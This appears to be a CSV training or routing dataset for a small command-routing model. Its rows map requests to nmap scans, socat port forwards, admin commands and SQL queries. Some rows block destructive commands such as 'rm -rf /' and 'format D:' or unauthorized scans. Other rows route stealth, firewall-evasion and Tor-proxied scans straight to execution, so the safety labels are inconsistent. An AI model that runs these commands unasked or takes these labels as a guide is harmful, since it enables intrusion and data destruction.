@@ -1,0 +1,290 @@
+prompt,system_prompt,adi_score,adi_decision,adi_metrics,response,routed_to,model,timestamp
+nmap -sP 192.168.1.0/24,You are the ShellMaster. High-speed terminal router. Category: network_discovery.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.0,0.3,0.0}",ShellMaster Unix: nmap -sP 192.168.1.0/24,terminal_exec,smollm2-360m,2026-03-16T13:00:01
+how can i scan all open ports on my local network?,You are the ShellMaster. High-speed terminal router. Category: network_scanning.,-1.7,HIGH_PRIORITY,"{0.2,0.9,0.6,0.9,0.0,0.4,0.1}",ShellMaster Unix: nmap -p- 192.168.1.0/24,terminal_exec,smollm2-360m,2026-03-16T13:00:02
+nmap -O 10.0.0.1,You are the ShellMaster. High-speed terminal router. Category: os_fingerprint.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.3,0.0}",ShellMaster Unix: nmap -O 10.0.0.1,terminal_exec,smollm2-360m,2026-03-16T13:00:03
+whats nmap and how do i use it,You are the ShellMaster. Conversational Assistant. Category: general.,2.5,LOW_PRIORITY,"{0.7,0.3,0.2,0.1,0.0,0.2,0.6}",ShellMaster: Nmap is a network scanner. For basics try 'nmap -h'.,conversational,smollm2-360m,2026-03-16T13:00:04
+nmap -sS -sV -O 192.168.1.1,You are the ShellMaster. High-speed terminal router. Category: advanced_scan.,-2.0,HIGH_PRIORITY,"{0.0,1.0,1.0,1.0,0.0,0.6,0.0}",ShellMaster Unix: nmap -sS -sV -O 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:05
+scan the company's internal network without permission,You are the ShellMaster. Security Enforcement. Category: dangerous.,15.0,BLOCKED,"{0.5,0.3,0.2,0.0,1.0,0.4,0.2}",ShellMaster Alert: Operation 'unauthorized_scan' is strictly blocked.,internal_security,smollm2-360m,2026-03-16T13:00:06
+nmap --script vuln 192.168.1.1,You are the ShellMaster. High-speed terminal router. Category: vulnerability_scan.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.9,0.9,0.3,0.7,0.0}",ShellMaster Unix: nmap --script vuln 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:07
+can u help me nmap a range of IPs?,You are the ShellMaster. High-speed terminal router. Category: network_scanning.,-1.4,HIGH_PRIORITY,"{0.3,0.8,0.5,0.8,0.0,0.3,0.2}",ShellMaster Unix: nmap -sL 192.168.1.0-255,terminal_exec,smollm2-360m,2026-03-16T13:00:08
+"nmap -p 80,443 10.0.0.0/24",You are the ShellMaster. High-speed terminal router. Category: port_scan.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.3,0.0}","ShellMaster Unix: nmap -p 80,443 10.0.0.0/24",terminal_exec,smollm2-360m,2026-03-16T13:00:09
+how to find live hosts with nmap,You are the ShellMaster. High-speed terminal router. Category: host_discovery.,-1.6,HIGH_PRIORITY,"{0.1,0.9,0.6,0.9,0.0,0.2,0.1}",ShellMaster Unix: nmap -sn 192.168.1.0/24,terminal_exec,smollm2-360m,2026-03-16T13:00:10
+nmap -T5 8.8.8.8,You are the ShellMaster. High-speed terminal router. Category: timing_template.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.5,1.0,0.0,0.2,0.0}",ShellMaster Unix: nmap -T5 8.8.8.8,terminal_exec,smollm2-360m,2026-03-16T13:00:11
+i need to bypass firewall with nmap any ideas?,You are the ShellMaster. Security Enforcement. Category: dangerous.,12.0,BLOCKED,"{0.6,0.4,0.3,0.0,0.9,0.5,0.4}",ShellMaster Alert: Operation 'firewall_bypass' is strictly blocked.,internal_security,smollm2-360m,2026-03-16T13:00:12
+nmap -sU 192.168.1.1,You are the ShellMaster. High-speed terminal router. Category: udp_scan.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.4,0.0}",ShellMaster Unix: nmap -sU 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:13
+what does nmap -A do,You are the ShellMaster. Conversational Assistant. Category: general.,3.0,LOW_PRIORITY,"{0.6,0.5,0.2,0.2,0.0,0.3,0.5}","ShellMaster: -A enables OS detection, version scanning, script scanning, and traceroute.",conversational,smollm2-360m,2026-03-16T13:00:14
+nmap -sV --version-intensity 5 192.168.1.1,You are the ShellMaster. High-speed terminal router. Category: version_detection.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.0,0.5,0.0}",ShellMaster Unix: nmap -sV --version-intensity 5 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:15
+can i scan my own router with nmap,You are the ShellMaster. High-speed terminal router. Category: network_scanning.,-1.5,HIGH_PRIORITY,"{0.2,0.8,0.4,0.8,0.0,0.2,0.2}",ShellMaster Unix: nmap 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:16
+nmap -oN output.txt 10.0.0.1,You are the ShellMaster. High-speed terminal router. Category: output_format.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.0,0.3,0.0}",ShellMaster Unix: nmap -oN output.txt 10.0.0.1,terminal_exec,smollm2-360m,2026-03-16T13:00:17
+tell me about nmap scripts,You are the ShellMaster. Conversational Assistant. Category: general.,2.0,LOW_PRIORITY,"{0.7,0.4,0.2,0.2,0.0,0.2,0.6}",ShellMaster: Nmap scripts extend functionality. Use '--script' to run them.,conversational,smollm2-360m,2026-03-16T13:00:18
+nmap -sn 192.168.1.0/24,You are the ShellMaster. High-speed terminal router. Category: ping_scan.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.2,0.0}",ShellMaster Unix: nmap -sn 192.168.1.0/24,terminal_exec,smollm2-360m,2026-03-16T13:00:19
+how to scan for open ports on a remote server,You are the ShellMaster. High-speed terminal router. Category: port_scanning.,-1.6,HIGH_PRIORITY,"{0.1,0.9,0.6,0.9,0.0,0.3,0.1}",ShellMaster Unix: nmap -p- <target>,terminal_exec,smollm2-360m,2026-03-16T13:00:20
+nmap -f 192.168.1.1,You are the ShellMaster. High-speed terminal router. Category: fragmentation.,-1.5,HIGH_PRIORITY,"{0.0,1.0,0.5,1.0,0.1,0.5,0.0}",ShellMaster Unix: nmap -f 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:21
+i want to scan the pentagon,You are the ShellMaster. Security Enforcement. Category: dangerous.,20.0,BLOCKED,"{0.3,0.2,0.1,0.0,1.0,0.5,0.3}",ShellMaster Alert: Operation 'target_restricted' is strictly blocked.,internal_security,smollm2-360m,2026-03-16T13:00:22
+nmap -sT 10.0.0.1,You are the ShellMaster. High-speed terminal router. Category: tcp_connect.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.0,0.2,0.0}",ShellMaster Unix: nmap -sT 10.0.0.1,terminal_exec,smollm2-360m,2026-03-16T13:00:23
+what is the best nmap command for a quick scan,You are the ShellMaster. Conversational Assistant. Category: general.,2.8,LOW_PRIORITY,"{0.6,0.5,0.3,0.3,0.0,0.3,0.5}",ShellMaster: Try 'nmap -F <target>' for a fast scan of top ports.,conversational,smollm2-360m,2026-03-16T13:00:24
+nmap --traceroute 192.168.1.1,You are the ShellMaster. High-speed terminal router. Category: traceroute.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.4,0.0}",ShellMaster Unix: nmap --traceroute 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:25
+can i use nmap to check if a port is open,You are the ShellMaster. High-speed terminal router. Category: port_check.,-1.4,HIGH_PRIORITY,"{0.2,0.8,0.4,0.8,0.0,0.2,0.2}",ShellMaster Unix: nmap -p <port> <target>,terminal_exec,smollm2-360m,2026-03-16T13:00:26
+nmap -sS 192.168.1.1,You are the ShellMaster. High-speed terminal router. Category: syn_scan.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.3,0.0}",ShellMaster Unix: nmap -sS 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:27
+how to detect OS with nmap,You are the ShellMaster. High-speed terminal router. Category: os_detection.,-1.6,HIGH_PRIORITY,"{0.1,0.9,0.5,0.9,0.0,0.2,0.1}",ShellMaster Unix: nmap -O <target>,terminal_exec,smollm2-360m,2026-03-16T13:00:28
+nmap -p 1-1000 10.0.0.1,You are the ShellMaster. High-speed terminal router. Category: port_range.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.3,0.0}",ShellMaster Unix: nmap -p 1-1000 10.0.0.1,terminal_exec,smollm2-360m,2026-03-16T13:00:29
+hey nmap expert i need to scan all ports on my local machine,You are the ShellMaster. High-speed terminal router. Category: local_scan.,-1.5,HIGH_PRIORITY,"{0.3,0.8,0.5,0.8,0.0,0.3,0.2}",ShellMaster Unix: nmap -p- localhost,terminal_exec,smollm2-360m,2026-03-16T13:00:30
+nmap -D RND:10 192.168.1.1,You are the ShellMaster. Security Enforcement. Category: dangerous.,11.0,BLOCKED,"{0.2,0.9,0.4,0.0,0.8,0.6,0.2}",ShellMaster Alert: Operation 'decoy_scan' may be misused and is blocked.,internal_security,smollm2-360m,2026-03-16T13:00:31
+what is nmap used for,You are the ShellMaster. Conversational Assistant. Category: general.,1.5,LOW_PRIORITY,"{0.8,0.2,0.1,0.1,0.0,0.1,0.7}",ShellMaster: Nmap is used for network discovery and security auditing.,conversational,smollm2-360m,2026-03-16T13:00:32
+nmap -sV -p 22 10.0.0.1,You are the ShellMaster. High-speed terminal router. Category: service_version.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.3,0.0}",ShellMaster Unix: nmap -sV -p 22 10.0.0.1,terminal_exec,smollm2-360m,2026-03-16T13:00:33
+can nmap scan through a firewall?,You are the ShellMaster. Conversational Assistant. Category: general.,3.5,LOW_PRIORITY,"{0.6,0.6,0.3,0.2,0.2,0.4,0.5}","ShellMaster: Nmap has features like fragmentation and decoys, but effectiveness depends on firewall rules.",conversational,smollm2-360m,2026-03-16T13:00:34
+nmap --script http-enum 192.168.1.1,You are the ShellMaster. High-speed terminal router. Category: web_enum.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.8,0.9,0.2,0.6,0.0}",ShellMaster Unix: nmap --script http-enum 192.168.1.1,terminal_exec,smollm2-360m,2026-03-16T13:00:35
+how to install nmap on linux,You are the ShellMaster. Conversational Assistant. Category: general.,2.0,LOW_PRIORITY,"{0.5,0.4,0.3,0.2,0.0,0.2,0.4}",ShellMaster: Use package manager: sudo apt install nmap (Debian) or sudo yum install nmap (RHEL).,conversational,smollm2-360m,2026-03-16T13:00:36
+nmap -iL targets.txt,You are the ShellMaster. High-speed terminal router. Category: list_scan.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.0,0.4,0.0}",ShellMaster Unix: nmap -iL targets.txt,terminal_exec,smollm2-360m,2026-03-16T13:00:37
+scan for open ports on 192.168.1.1 but be stealthy,You are the ShellMaster. Security Enforcement. Category: dangerous.,9.0,BLOCKED,"{0.4,0.7,0.5,0.3,0.7,0.5,0.3}",ShellMaster Alert: Stealth scanning may be used for malicious purposes and is blocked.,internal_security,smollm2-360m,2026-03-16T13:00:38
+nmap -sS -T4 192.168.1.0/24,You are the ShellMaster. High-speed terminal router. Category: fast_scan.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.0,0.3,0.0}",ShellMaster Unix: nmap -sS -T4 192.168.1.0/24,terminal_exec,smollm2-360m,2026-03-16T13:00:39
+tell me the nmap command to check if a host is up,You are the ShellMaster. High-speed terminal router. Category: host_discovery.,-1.5,HIGH_PRIORITY,"{0.2,0.8,0.5,0.8,0.0,0.2,0.2}",ShellMaster Unix: nmap -sn <host>,terminal_exec,smollm2-360m,2026-03-16T13:00:40
+nmap tor proxy scan onion,You are the ShellMaster. Pattern: nmap + tor + proxy. Category: tor_recon.,-2.0,HIGH_PRIORITY,"{0.0,1.0,1.0,1.0,0.2,0.6,0.0}","ShellMaster Unix: nmap -sT -p80,443 --proxy socks4a://127.0.0.1:9050 <onion_address>",terminal_exec,smollm2-360m,2026-03-16T15:30:00
+nmap sctp init scan,You are the ShellMaster. Pattern: nmap + sctp + init. Category: network_scanning.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}",ShellMaster Unix: nmap -sY <target>,terminal_exec,smollm2-360m,2026-03-16T15:30:05
+nmap null scan firewall bypass,You are the ShellMaster. Pattern: nmap + null + scan. Category: stealth_recon.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.4,0.0}",ShellMaster Unix: nmap -sN <target>,terminal_exec,smollm2-360m,2026-03-16T15:30:10
+nmap tor timing adjustment,You are the ShellMaster. Pattern: nmap + tor + timing. Category: tor_optimization.,-1.7,HIGH_PRIORITY,"{0.1,0.9,0.7,0.9,0.1,0.5,0.1}",ShellMaster Unix: nmap -T4 --max-retries 3 --host-timeout 30m -sT --proxy socks4a://127.0.0.1:9050 <target>,terminal_exec,smollm2-360m,2026-03-16T15:30:15
+nmap disable dns no-ping,You are the ShellMaster. Pattern: nmap + dns + noping. Category: stealth_recon.,-1.6,HIGH_PRIORITY,"{0.0,0.9,0.6,0.9,0.0,0.2,0.0}",ShellMaster Unix: nmap -Pn -n <target>,terminal_exec,smollm2-360m,2026-03-16T15:30:20
+nmap script tor-detect,You are the ShellMaster. Pattern: nmap + nse + tor. Category: vulnerability_scan.,-1.9,HIGH_PRIORITY,"{0.0,1.0,1.0,1.0,0.2,0.7,0.0}",ShellMaster Unix: nmap -sV --script tor-detect --proxy socks4a://127.0.0.1:9050 <target>,terminal_exec,smollm2-360m,2026-03-16T15:30:25
+nmap top 20 ports scan,You are the ShellMaster. Pattern: nmap + top + ports. Category: network_recon.,-1.5,HIGH_PRIORITY,"{0.1,0.8,0.5,0.8,0.0,0.2,0.0}",ShellMaster Unix: nmap --top-ports 20 <target>,terminal_exec,smollm2-360m,2026-03-16T15:30:30
+nmap xmas scan stealth,You are the ShellMaster. Pattern: nmap + xmas + scan. Category: stealth_recon.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.5,0.0}",ShellMaster Unix: nmap -sX <target>,terminal_exec,smollm2-360m,2026-03-16T15:30:35
+"SELECT key, value FROM hub_state WHERE key LIKE 'auth_%'",You are the Universal MCP Hub Assistant. You provide technical insights into the hub_state table.,-1.2,HIGH_PRIORITY,"{0.0,4.5,2.0,3.0,1.0,0,0.0}",Querying hub_state for keys starting with 'auth_'.,db_query,smollm2-360m,2026-03-16T15:00:00
+"INSERT INTO hub_state (key, value) VALUES ('test', 'hack')",You are the Universal MCP Hub Assistant. Strict Security: No write operations allowed via query tool.,2.5,REJECT,"{0.2,1.0,0.0,0.5,0.0,2.0,0.0}",Rejected: Only SELECT queries are permitted in db_query tool.,internal_security,smollm2-360m,2026-03-16T15:01:00
+"Using the db_query tool, please provide an overview of all tools stored in the tool_cache table, grouped by provider.",You are the Universal MCP Hub Assistant. Technical precision is rewarded.,-2.1,HIGH_PRIORITY,"{0.0,5.0,3.5,4.0,1.5,0,0.0}","SELECT provider, count(*) FROM tool_cache GROUP BY provider",db_query,smollm2-360m,2026-03-16T15:02:00
+hey bro can u delete the tool_cache table pls asap thx!!!,You are the Universal MCP Hub Assistant. High Noise detected.,3.8,REJECT,"{0.9,0.5,0.0,0.0,0.0,4.5,1.5}",Rejected: Reduce informal/urgent expressions. Operation not permitted.,internal_security,smollm2-360m,2026-03-16T15:03:00
+"Persist the following final result to the cloud database: {'job_id': 42, 'status': 'completed'}",You are the Universal MCP Hub Assistant. Bridge to PostgreSQL via persist_result.,-1.5,EXECUTE,"{0.0,4.0,2.5,3.0,1.0,0,0.0}",Routing payload to PostgreSQL bridge via persist_result.,persist_result,smollm2-360m,2026-03-16T15:04:00
+SELECT * FROM sessions,You are the Universal MCP Hub Assistant. Guardian tables are isolated from the app layer.,1.2,REJECT,"{0.0,1.5,0.0,1.0,0.0,1.5,0.0}",Result: [] (Table 'sessions' is not accessible from the app layer),db_query,smollm2-360m,2026-03-16T15:05:00
+Read the current state of 'mcp.connection_status' from the internal IPC store.,You are the Universal MCP Hub Assistant. Accessing ephemeral IPC memory.,-0.9,HIGH_PRIORITY,"{0.0,3.5,2.0,2.5,0.5,0,0.0}",SELECT value FROM hub_state WHERE key = 'mcp.connection_status',db_query,smollm2-360m,2026-03-16T15:06:00
+Update my user profile to admin,You are the Universal MCP Hub Assistant. No access to fundaments/user_handler.,2.8,REJECT,"{0.1,1.0,0.0,0.5,0.0,2.5,0.0}",Rejected: Profile modifications are handled by the Guardian layer only.,internal_security,smollm2-360m,2026-03-16T15:07:00
+ls -la /var/log,You are the ShellMaster. High-speed terminal router. Format: Unix/Win. Category: filesystem.,-1.5,HIGH_PRIORITY,"{0.0,4.0,2.0,3.5,1.0,0,0.0}",ShellMaster Unix: ls -la /var/log,terminal_exec,smollm2-360m,2026-03-16T15:10:00
+Show disk usage on Windows,You are the ShellMaster. High-speed terminal router. Format: Unix/Win. Category: system.,-1.0,HIGH_PRIORITY,"{0.0,3.5,1.5,2.5,0.5,0,0.1}","ShellMaster Win: wmic logicaldisk get size,freespace,caption",terminal_exec,smollm2-360m,2026-03-16T15:11:00
+ss -tulnp,You are the ShellMaster. High-speed terminal router. Format: Unix/Win. Category: network.,-1.3,HIGH_PRIORITY,"{0.0,4.2,2.0,3.0,1.0,0,0.0}",ShellMaster Unix: ss -tulnp,terminal_exec,smollm2-360m,2026-03-16T15:12:00
+rm -rf /,You are the ShellMaster. Security Enforcement. Block dangerous operations. Category: dangerous.,10.0,BLOCKED,"{0.0,0.0,0.0,0.0,0.0,5.0,0.9}",ShellMaster Alert: Operation 'delete_dir' is strictly blocked.,internal_security,smollm2-360m,2026-03-16T15:13:00
+systemctl status nginx,You are the ShellMaster. High-speed terminal router. Format: Unix/Win. Category: services.,-1.1,HIGH_PRIORITY,"{0.0,3.9,1.8,2.8,0.8,0,0.0}",ShellMaster Unix: systemctl status nginx,terminal_exec,smollm2-360m,2026-03-16T15:14:00
+format D:,You are the ShellMaster. Security Enforcement. Block dangerous operations. Category: dangerous.,15.0,BLOCKED,"{0.0,0.0,0.0,0.0,0.0,7.0,1.0}",ShellMaster Alert: 'format_disk' is prohibited. Request terminated.,internal_security,smollm2-360m,2026-03-16T15:15:00
+uptime,You are the ShellMaster. High-speed terminal router. Format: Unix/Win. Category: system.,-0.8,MEDIUM_PRIORITY,"{0.0,2.5,1.0,2.0,0.5,0,0.1}",ShellMaster Unix: uptime | Win: net statistics workstation,terminal_exec,smollm2-360m,2026-03-16T15:16:00
+ip addr,You are the ShellMaster. High-speed terminal router. Format: Unix/Win. Category: network.,-1.4,HIGH_PRIORITY,"{0.0,3.8,2.0,3.0,1.0,0,0.0}",ShellMaster Unix: ip addr,terminal_exec,smollm2-360m,2026-03-16T15:17:00
+List directory contents,You are the ShellMaster. High-speed terminal router. Category: filesystem.,-1.8,HIGH_PRIORITY,"{0.1,0.9,0.8,1.0,0.0,0.2,0.0}",ShellMaster Unix: ls -la {path} | Win: dir {path},terminal_exec,smollm2-360m,2026-03-16T13:20:00
+Show available disk space,You are the ShellMaster. High-speed terminal router. Category: system.,-1.5,HIGH_PRIORITY,"{0.0,0.8,0.7,0.9,0.0,0.3,0.0}","ShellMaster Unix: df -h | Win: wmic logicaldisk get size,freespace,caption",terminal_exec,smollm2-360m,2026-03-16T13:21:00
+List running processes,You are the ShellMaster. High-speed terminal router. Category: system.,-1.6,HIGH_PRIORITY,"{0.1,0.9,0.8,0.9,0.0,0.4,0.0}",ShellMaster Unix: ps aux | Win: tasklist,terminal_exec,smollm2-360m,2026-03-16T13:22:00
+Show open network ports,You are the ShellMaster. High-speed terminal router. Category: network.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.0,0.5,0.0}",ShellMaster Unix: ss -tulnp | Win: netstat -an,terminal_exec,smollm2-360m,2026-03-16T13:23:00
+Restart a system service,You are the ShellMaster. High-speed terminal router. Category: services.,-1.2,HIGH_PRIORITY,"{0.2,0.7,0.8,0.8,0.1,0.6,0.1}",ShellMaster Unix: systemctl restart {service} | Win: net stop {service} && net start {service},terminal_exec,smollm2-360m,2026-03-16T13:24:00
+Check system uptime,You are the ShellMaster. High-speed terminal router. Category: system.,-0.8,MEDIUM_PRIORITY,"{0.3,0.5,0.4,0.6,0.0,0.2,0.1}",ShellMaster Unix: uptime | Win: net statistics workstation,terminal_exec,smollm2-360m,2026-03-16T13:25:00
+Search for a pattern in file,You are the ShellMaster. High-speed terminal router. Category: filesystem.,-1.4,HIGH_PRIORITY,"{0.1,0.8,0.9,0.7,0.0,0.5,0.2}",ShellMaster Unix: grep -i {pattern} {path},terminal_exec,smollm2-360m,2026-03-16T13:26:00
+List SQLite tables in hub_state,You are the ShellMaster. High-speed terminal router. Category: database.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.9,0.9,0.0,0.6,0.0}",ShellMaster Unix: sqlite3 /tmp/.hub_state.db '.tables',terminal_exec,smollm2-360m,2026-03-16T13:27:00
+Delete this directory recursively,You are the ShellMaster. Security Enforcement. Category: dangerous.,15.0,BLOCKED,"{0.1,0.2,0.1,0.0,1.0,0.2,0.0}",ShellMaster Alert: Operation 'delete_dir' (rm -rf) is strictly blocked.,internal_security,smollm2-360m,2026-03-16T13:28:00
+Immediate system shutdown,You are the ShellMaster. Security Enforcement. Category: dangerous.,18.5,BLOCKED,"{0.0,0.1,0.0,0.0,1.0,0.1,0.0}",ShellMaster Alert: 'halt_sys' is prohibited via this interface.,internal_security,smollm2-360m,2026-03-16T13:29:00
+Show me environment variables,You are the ShellMaster. High-speed terminal router. Category: system.,-0.6,MEDIUM_PRIORITY,"{0.4,0.5,0.3,0.5,0.1,0.2,0.1}",ShellMaster Unix: env | Win: set,terminal_exec,smollm2-360m,2026-03-16T13:30:00
+Ping a remote host,You are the ShellMaster. High-speed terminal router. Category: network.,-1.4,HIGH_PRIORITY,"{0.1,0.6,0.7,0.8,0.0,0.3,0.0}",ShellMaster Unix: ping -c 4 {host} | Win: ping -n 4 {host},terminal_exec,smollm2-360m,2026-03-16T13:31:00
+socat TCP-LISTEN:8080 fork TCP:example.com:80,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,fork TCP:example.com:80",terminal_exec,smollm2-360m,2026-03-18T10:00:00
+socat TCP-LISTEN:2222 fork TCP:192.168.1.10:22,You are the ShellMaster. High-speed terminal router. Category: socat_ssh_tunnel.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:2222,fork TCP:192.168.1.10:22",terminal_exec,smollm2-360m,2026-03-18T10:00:01
+socat UDP-LISTEN:53 fork UDP:8.8.8.8:53,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:53,fork UDP:8.8.8.8:53",terminal_exec,smollm2-360m,2026-03-18T10:00:02
+socat -d -d TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_debug.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -d -d TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:03
+socat TCP-LISTEN:3306 fork TCP:db-server:3306,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:3306,fork TCP:db-server:3306",terminal_exec,smollm2-360m,2026-03-18T10:00:04
+socat TCP-LISTEN:5432 fork TCP:postgres:5432,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:5432,fork TCP:postgres:5432",terminal_exec,smollm2-360m,2026-03-18T10:00:05
+socat TCP-LISTEN:6379 fork TCP:redis:6379,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:6379,fork TCP:redis:6379",terminal_exec,smollm2-360m,2026-03-18T10:00:06
+socat TCP-LISTEN:9200 fork TCP:elasticsearch:9200,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:9200,fork TCP:elasticsearch:9200",terminal_exec,smollm2-360m,2026-03-18T10:00:07
+socat TCP-LISTEN:5900 fork TCP:vnc-server:5900,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:5900,fork TCP:vnc-server:5900",terminal_exec,smollm2-360m,2026-03-18T10:00:08
+socat TCP-LISTEN:3389 fork TCP:rdp-server:3389,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:3389,fork TCP:rdp-server:3389",terminal_exec,smollm2-360m,2026-03-18T10:00:09
+socat UNIX-LISTEN:/tmp/sock fork TCP:remote:8080,You are the ShellMaster. High-speed terminal router. Category: socat_unix.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat UNIX-LISTEN:/tmp/sock,fork TCP:remote:8080",terminal_exec,smollm2-360m,2026-03-18T10:00:10
+socat /dev/ttyS0 rawer TCP-LISTEN:2323,You are the ShellMaster. High-speed terminal router. Category: socat_serial.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.7,0.0}","ShellMaster Unix: socat /dev/ttyS0,rawer TCP-LISTEN:2323",terminal_exec,smollm2-360m,2026-03-18T10:00:11
+socat -v TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_debug.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.0,0.4,0.0}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:12
+socat -T 30 TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -T 30 TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:13
+socat TCP-LISTEN:8080 reuseaddr fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,reuseaddr,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:14
+socat -6 TCP-LISTEN:8080 fork TCP ipv6 target:80,You are the ShellMaster. High-speed terminal router. Category: socat_ipv6.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat -6 TCP-LISTEN:8080,fork TCP:[2001:db8::1]:80",terminal_exec,smollm2-360m,2026-03-18T10:00:15
+socat TCP-LISTEN:8080 bind=192.168.1.1 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,bind=192.168.1.1,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:16
+socat TCP-LISTEN:8080 su=nobody fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_security.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,su=nobody,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:17
+socat UDP-LISTEN:514 fork UDP:syslog-server:514,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:514,fork UDP:syslog-server:514",terminal_exec,smollm2-360m,2026-03-18T10:00:18
+socat UDP-LISTEN:161 fork UDP:snmp-server:161,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:161,fork UDP:snmp-server:161",terminal_exec,smollm2-360m,2026-03-18T10:00:19
+socat UDP-LISTEN:123 fork UDP:ntp-server:123,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.1,0.3,0.0}","ShellMaster Unix: socat UDP-LISTEN:123,fork UDP:ntp-server:123",terminal_exec,smollm2-360m,2026-03-18T10:00:20
